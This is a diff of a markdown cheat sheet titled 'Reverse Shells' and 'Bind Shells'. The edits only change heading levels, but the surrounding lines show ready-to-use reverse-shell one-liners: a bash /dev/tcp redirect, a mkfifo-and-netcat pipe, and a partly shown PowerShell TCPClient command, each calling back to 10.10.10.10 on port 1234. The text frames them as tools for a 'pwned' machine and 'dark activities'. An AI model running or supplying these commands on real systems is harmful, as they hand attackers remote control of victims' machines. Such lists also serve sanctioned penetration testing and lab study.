@@ -1,5 +1,5 @@
 
-## Reverse Shells:
+# Reverse Shells:
 
 ### Linux:
 ###### *To get reverse shell on the pwned linux system:*
@@ -10,7 +10,6 @@ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
-
 ### Windows:
 ***powershell command to get reverse shell on the windows system:***
 
@@ -19,8 +18,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```
 
 ---
-
-## Bind Shells:
+# Bind Shells:
 ***basically its we open the port on the targeted or pwned machine and we connect with our attacker or local machine with we are using for the dark activities***
 
 ### Linux:
